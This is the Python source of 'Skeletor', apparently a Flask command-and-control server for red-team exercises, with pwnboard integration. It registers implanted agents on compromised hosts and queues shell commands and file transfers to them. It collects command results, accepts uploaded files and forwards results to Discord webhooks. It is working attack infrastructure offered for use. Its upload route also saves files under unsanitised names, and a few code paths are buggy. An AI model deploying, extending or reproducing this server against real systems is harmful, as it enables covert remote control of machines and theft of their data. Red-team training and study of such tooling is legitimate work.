#!/usr/bin/env python3

from flask import Flask, request, jsonify, abort, send_from_directory,redirect,url_for
from flask_sqlalchemy import SQLAlchemy
from werkzeug.exceptions import NotFound
import requests
from datetime import datetime, timezone
import time
import threading
import os
import logging
import io
from werkzeug.utils import secure_filename
from dotenv import load_dotenv

app = Flask(__name__)
load_dotenv()

#Configuration dictionary
config = {"upload_dir": "uploads", "show_requests": True,"debug":False,"pwnboard":os.getenv("PWNBOARD",False),"pwnboard_url":os.getenv("PWNBOARD_URL",""),"ip_whitelisting":False,"allowed_ips":["127.0.0.1","::1"],"auth_key":os.getenv("SKELETOR_AUTH_KEY",None),"notify_discord":os.getenv("NOTIFY_DISCORD",False)}
if config.get("notify_discord"):
    config["RESULT_WEBHOOK"] = os.getenv("SKELETOR_RESULT_WEBHOOK",None)
    config["STATUS_WEBHOOK"] = os.getenv("SKELETOR_STATUS_WEBHOOK",None)
for i in config:
    print(i+":"+str(config[i]))

DB_HOST = os.getenv("DB_HOST", None)
if DB_HOST:
    # PostgreSQL configuration
    DB_USER = os.getenv("DB_USER", "skeletor")
    DB_PASSWORD = os.getenv("DB_PASSWORD", "letredin")
    DB_NAME = os.getenv("DB_NAME", "c2")
    DB_PORT = os.getenv("DB_PORT", "5432")
    app.config['SQLALCHEMY_DATABASE_URI'] = f'postgresql://{DB_USER}:{DB_PASSWORD}@{DB_HOST}:{DB_PORT}/{DB_NAME}'
    print(f"Using PostgreSQL: {DB_HOST}:{DB_PORT}/{DB_NAME}")
else:
    # Use SQLite if no POSTGRESQL DB HOST is specified
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2.db'
    print("Using SQLite: c2.db")
db = SQLAlchemy(app)

#logging config
log = logging.getLogger('werkzeug')
if config['show_requests'] or config['debug']:
    log.setLevel(logging.INFO)
else:
    log.setLevel(logging.ERROR)

# Association table: connects agents <-> tags
agent_tags = db.Table('agent_tags',db.Column('agent_id', db.Integer, db.ForeignKey('agent.id'), primary_key=True),db.Column('tag_id', db.Integer, db.ForeignKey('tag.id'), primary_key=True))

class Tag(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), unique=True, nullable=False)

# Database models
class Agent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(100), unique=True, nullable=False)
    status = db.Column(db.String(20), default='active')
    targeted = db.Column(db.Boolean,default=False)
    last_seen = db.Column(db.DateTime, default=datetime.now(tz=timezone.utc))
    last_command = db.Column(db.String(5000), nullable=True,default="NULL")
    last_result = db.Column(db.Text, nullable=True,default="NULL")
    callbacks = db.Column(db.Integer, nullable=False, default=0)
    tags = db.relationship(
        'Tag',
        secondary=agent_tags,
        backref=db.backref('agents', lazy='dynamic')
    )

class Task(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(100), db.ForeignKey('agent.agent_id'), nullable=False)
    action = db.Column(db.String(5000), nullable=True,default="NULL")
    input1 = db.Column(db.String(5000), nullable=True,default="NULL")
    input2 = db.Column(db.String(5000), nullable=True,default="NULL")
    destination = db.Column(db.String(1000), nullable=True,default="NULL")
    completed = db.Column(db.Boolean, default=False)
    result = db.Column(db.Text, nullable=True,default="NULL")
    returncode = db.Column(db.Integer, nullable=True,default=1234) # Default value to differentiate from actual return codes

# Initialize database
with app.app_context():
    db.create_all()

#FUNCTIONS:

def setup():
    ip_environment_variable = os.getenv('SKELETOR_ALLOWED_IPS', "") #Defaults to empty string
    if ip_environment_variable != "":
        for ip in ip_environment_variable.split(","):
            config["allowed_ips"].append(ip.strip())
    print(config["allowed_ips"])
    os.makedirs(config['upload_dir'], exist_ok=True)
    os.makedirs("files", exist_ok=True)


def restrict_remote(func): # Decorator to restrict management routes
    def wrapper(*args, **kwargs):
        if config.get("ip_whitelisting"):
            if request.remote_addr not in config["allowed_ips"]: #Validate IP is in whitelist
                abort(403)
        if config.get("auth_key") is not None: #If auth_key is set, check headers to validate key matches that in config
            key = request.headers.get('X-Skeletor-Auth')
            if key != config.get("auth_key"):
                abort(403)
        return func(*args, **kwargs)
    wrapper.__name__ = func.__name__  # To preserve function name for Flask routing
    return wrapper

def update_pwnboard(ip):
    if config["pwnboard"]:
        try:
            data = {'ip': ip, 'type': "skeletor"}
            req = requests.post(config["pwnboard_url"], json=data, timeout=3)
        except:
            pass

def update_timestamp(agent_id):
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    agent.last_seen = datetime.now(tz=timezone.utc)
    db.session.commit()

def check_agent_status():
    while True:
        timeout = 300  # 5 minutes
        now = datetime.now(tz=timezone.utc)
        with app.app_context():
            agents = Agent.query.all()
            for agent in agents:
                if agent.last_seen is not None:
                    if agent.last_seen.tzinfo is None:  # If it's naive, assume it's in UTC
                        agent.last_seen = agent.last_seen.replace(tzinfo=timezone.utc)
                if (now - agent.last_seen).total_seconds() > timeout:
                    if agent.status != 'inactive':
                        if config.get("notify_discord"):
                            discord_notify_inactive(agent.agent_id)
                        agent.status = 'inactive'
            db.session.commit()
        time.sleep(180)

def on_callback(agent):
    if agent.status == 'inactive' and config.get("discord_notify"):
        discord_notify_return(agent.agent_id)
    agent.status = 'active'
    agent.callbacks += 1
    update_timestamp(agent.agent_id)
    update_pwnboard(agent.agent_id)

def discord_notify_newagent(agent_id):
    webhook_url = config["STATUS_WEBHOOK"]
    if webhook_url:
        requests.post(webhook_url, json={"content": f"Registration received from {agent_id}"})


def discord_notify_inactive(agent_id):
    webhook_url = config["STATUS_WEBHOOK"]
    if webhook_url:
        requests.post(webhook_url, json={"content": f"{agent_id} is inactive!"})

def discord_notify_return(agent_id):
    webhook_url = config["STATUS_WEBHOOK"]
    if webhook_url:
        requests.post(webhook_url, json={"content": f"{agent_id} is back!"})

def discord_notify_result(agent_id,command,result):
    webhook_url = config["RESULT_WEBHOOK"]
    if webhook_url:
        try:
            r = requests.post(webhook_url, json={"content": f"Agent ID: {agent_id}\nCommand: {command}\nResult:\n\n{result}\n"})
            if r.status_code != 204:
                if r.text == '{"content": ["Must be 2000 or fewer in length."]}':
                    raise ValueError("Message too long")
                print("ERROR:\t",r.status_code,"-",r.text)
        except ValueError:
            file = io.BytesIO(result.encode())
            files = {'file': ('result.txt', file)}
            payload = {'content': f"Agent ID: {agent_id}\nCommand: {command}\nResult:\n\nResults too long, see file:"}
            r = requests.post(webhook_url, data=payload, files=files)
        except Exception as e:
            print("ERROR:\t",str(e))

    
#ROUTES:

#This first section is routes used by agents
@app.route('/register', methods=['POST'])
def register_agent():
    data = request.json
    agent_id = data.get('agent_id')
    os = data.get("os").lower()
    implant_type = data.get("implant_type")
    print(data)
    if agent_id:
        if config.get("notify_discord"):
            discord_notify_newagent(agent_id)
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if not agent:
            new_agent = Agent(agent_id=agent_id)
            db.session.add(new_agent)
            db.session.commit()
            if os:
                os_json = {"agent_id":agent_id,"tags":os}
                auth_key = config.get("auth_key")
                if auth_key is None:
                    requests.post("http://127.0.0.1/tag-agent",json=os_json,timeout=10)
                else:
                    requests.post("http://127.0.0.1/tag-agent",json=os_json,timeout=10,headers={"X-Skeletor-Auth":auth_key})
            if implant_type:
                implant_type_json = {"agent_id":agent_id,"tags":implant_type}
                auth_key = config.get("auth_key")
                if auth_key is None:
                    requests.post("http://127.0.0.1/tag-agent",json=os_json,timeout=10)
                else:
                    requests.post("http://127.0.0.1/tag-agent",json=os_json,timeout=10,headers={"X-Skeletor-Auth":auth_key})
            return jsonify({"message": "Agent registered successfully"}), 201
        else:
            agent.status = 'active'
            update_timestamp(agent_id)
            db.session.commit()
            return jsonify({"message": "Agent registration renewed"}), 200
    return jsonify({"error": "Invalid data"}), 400

@app.route('/results', methods=['POST'])
def submit_results():
    try:
        # print(request.json)
        print("Length",len(request.json['result']))
        data = request.json
        result = data['result']
        agent_id = data['agent_id']
        print(f"\nIP: {agent_id}" + "\t" + f"Result: {result}"+"\n")
        task_id = data['task_id']
        task = db.session.get(Task, task_id)
        task.completed = True
        task.returncode = data['returncode']
        if task.result != "NULL":
            task.result = result
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        agent.last_result = result
        db.session.commit()
        update_timestamp(agent_id)
        if config.get("notify_discord"):
            discord_notify_result(agent_id,agent.last_command,result)
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'failed','error':str(e)}), 400

@app.route('/tasks', methods=['POST'])
def get_task():
    ip = request.json.get('agent_id')
    if ip:
        agent = Agent.query.filter_by(agent_id=ip).first()
        if agent is None:
            return jsonify({"status": "Must re-register"}), 418 #If agent_id isn't in database, tell the client to re-register
        else:
            on_callback(agent)
            db.session.commit()
        task = Task.query.filter_by(agent_id=ip, completed=False).first()
        if task:
            task_data = {
                'action': task.action,
                'input': task.input1,
                'input2': task.input2,
                'task_id': task.id
            }
            if task.action == "command":
                agent.last_command = task.input1
            db.session.commit()
            return jsonify(task_data),200
        return jsonify({"status": "No tasks"}), 204
    else:
        return jsonify({"status": "Invalid data"}), 400
        

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    safe_filename = secure_filename(filename)  # Prevent directory traversal
    try:
        return send_from_directory("files", safe_filename, as_attachment=True)
    except NotFound:
        return jsonify({"error": "File not found"}), 404
    
@app.route('/upload', methods=['POST'])
def upload_file():
    try:
        if 'file' not in request.files:
            return jsonify({"error": "No file part in the request"}), 400
        file = request.files['file']
        if file.filename == '':
            return jsonify({"error": "No file selected for uploading"}), 400    
        file.save(os.path.join(config['upload_dir'], file.filename))
        return jsonify({"message": "File uploaded successfully!", "filename": file.filename}), 200
    except:
        return jsonify({"error": "Invalid data"}), 400

# Management routes:
@app.route('/get-agents', methods=['GET'])
@restrict_remote
def get_agents():
    agents = Agent.query.all()
    agents_data = []
    for agent in agents:
        agents_data.append({
            "agent_id": agent.agent_id,
            "status": agent.status,
            "callbacks": agent.callbacks,
            "last_seen": agent.last_seen.strftime("%H:%M:%S %m/%d/%Y") if agent.last_seen else "NULL",
            "tags": [t.name for t in agent.tags]
        })
    return jsonify(agents_data)

@app.route('/make-task', methods=['POST'])
@restrict_remote
def make_task():
    data = request.json
    agent_id = data.get('agent_id')
    action = data.get('action')
    # command = data.get('command')
    # if data['action'] == "command":
    #     command = data.get('command')
    # else:
    #     command = "NULL"
    if data.get("input"):
        input1 = data.get("input")
    else:
        input1 = "NULL"
    if data.get("input2"):
        input2 = data.get("input2")
    else:
        input2 = "NULL"
    try:
        new_task = Task(agent_id=agent_id, action=action, input1=input1, input2=input2)
        db.session.add(new_task)
        db.session.commit()
        return jsonify({"message": "Task created successfully"}), 201
    except:
        return jsonify({"error": "Invalid data"}), 400
    
@app.route('/get-result', methods=['POST'])
@restrict_remote
def get_result():
    data = request.json
    agent_id = data.get('agent_id')
    if agent_id:
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if agent:
            return jsonify({"command":agent.last_command,"result": agent.last_result}), 200
        return jsonify({"error": "Agent not found"}), 404
    return jsonify({"error": "Invalid data"}), 400

@app.route('/get-agent',methods=["POST"])
@restrict_remote
def get_agent():
    data = request.json
    agent_id = data.get('agent_id')
    if agent_id:
        agent = Agent.query.filter_by(agent_id=agent_id).first()
        if agent:
            return jsonify({"status":agent.status,"targeted":agent.targeted,"last_seen":agent.last_seen,"last_command":agent.last_command,"last_result":agent.last_result,"callbacks":agent.callbacks}), 200
        return jsonify({"error": "Agent not found"}), 404
    return jsonify({"error": "Invalid data"}), 400

#Targeting related routes: (used by skelctl and can be used by other management interfaces to issue commands to multiple agents at once)
@app.route('/targets', methods=['GET'])
@restrict_remote
def get_targets():
    targets = ""
    agents = Agent.query.filter_by(targeted=True).all()
    for agent in agents:
        targets += agent.agent_id + "\n"
    return targets

@app.route('/set-targets', methods=['POST'])
@restrict_remote
def set_targets():
    data = request.json
    ips = data.get('ips')
    if ips:
        for ip in ips:
            agent = Agent.query.filter_by(agent_id=ip).first()
            if agent:
                agent.targeted = True
                db.session.commit()
        return jsonify({"message": "Targets set successfully"}), 200
    return jsonify({"error": "Invalid data"}), 400

@app.route('/untarget', methods=['POST'])
@restrict_remote
def untarget():
    data = request.json
    ips = data.get('ips')
    if ips: 
        for ip in ips:
            agent = Agent.query.filter_by(agent_id=ip).first()
            if agent:
                agent.targeted = False
                db.session.commit()
        return jsonify({"message": "Targets unset successfully"}), 200
    return jsonify({"error": "Invalid data"}), 400

@app.route('/clear-targets', methods=['POST'])
@restrict_remote
def clear_targets():
    agents = Agent.query.filter_by(targeted=True).all()
    for agent in agents:
        agent.targeted = False
    db.session.commit()
    return jsonify({"message": "Targets cleared successfully"}), 200

#Tagging related routes:

@app.route('/tag-agent',methods=["POST"])
@restrict_remote
def tag_agent():
    data = request.json
    agent_id = data.get('agent_id')
    tags = data.get('tags') #Tags should be comma seperated list of tags
    if not agent_id or not tags:
        return jsonify({"error": "agent_id and tags are required"}), 400
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({"error": f"Agent {agent_id} not found"}), 404
    tag_names = [t.strip() for t in tags.split(",") if t.strip()]
    added_tags = []
    for tag_name in tag_names:
        # Check if tag exists, otherwise create it
        tag = Tag.query.filter_by(name=tag_name).first()
        if not tag:
            tag = Tag(name=tag_name)
            db.session.add(tag)
            db.session.flush()  # make sure tag.id exists before linking
        # Link tag to agent if not already linked
        if tag not in agent.tags:
            agent.tags.append(tag)
            added_tags.append(tag_name)
    db.session.commit()
    return jsonify({"agent_id": agent.agent_id,"added_tags": added_tags,"all_tags": [t.name for t in agent.tags]}), 200

@app.route('/remove-tag', methods=["POST"])
@restrict_remote
def remove_tag():
    data = request.json
    agent_id = data.get('agent_id')
    tags = data.get('tags')  # comma-separated list
    if not agent_id or not tags:
        return jsonify({"error": "agent_id and tags are required"}), 400
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({"error": f"Agent {agent_id} not found"}), 404
    tag_names = [t.strip() for t in tags.split(",") if t.strip()]
    removed_tags = []
    for tag_name in tag_names:
        tag = Tag.query.filter_by(name=tag_name).first()
        if tag and tag in agent.tags:
            agent.tags.remove(tag)
            removed_tags.append(tag_name)
    db.session.commit()
    return jsonify({"agent_id": agent.agent_id,"removed_tags": removed_tags,"all_tags": [t.name for t in agent.tags]}), 200

@app.route('/tagged', methods=["POST"])
@restrict_remote
def tagged():
    data = request.json
    tag_name = data.get('tag')
    if not tag_name:
        return jsonify({"error": "tag is required"}), 400
    tag = Tag.query.filter_by(name=tag_name).first()
    if not tag:
        return jsonify({"error": f"Tag '{tag_name}' not found"}), 404
    agent_ids = [agent.agent_id for agent in tag.agents]
    return jsonify({"agents": agent_ids}), 200

@app.route('/status', methods=['GET'])
def status():
    webpage_content = """
    <h1>Welcome to Skeletor</h1>
    <h3>Agent Status</h3>
    """
    for agent in Agent.query.all():
        webpage_content += f"<p>{agent.agent_id} - {agent.status}</p>"
    return webpage_content

#Main Page
@app.route('/', methods=['GET'])
def homepage():
    return redirect(url_for('status'))


def main():
    setup()
    agent_checker = threading.Thread(target=check_agent_status,daemon=True)
    agent_checker.start()
    app.run(debug=False,host='0.0.0.0',port=80,threaded=True)


# if __name__ == '__main__':
#     main()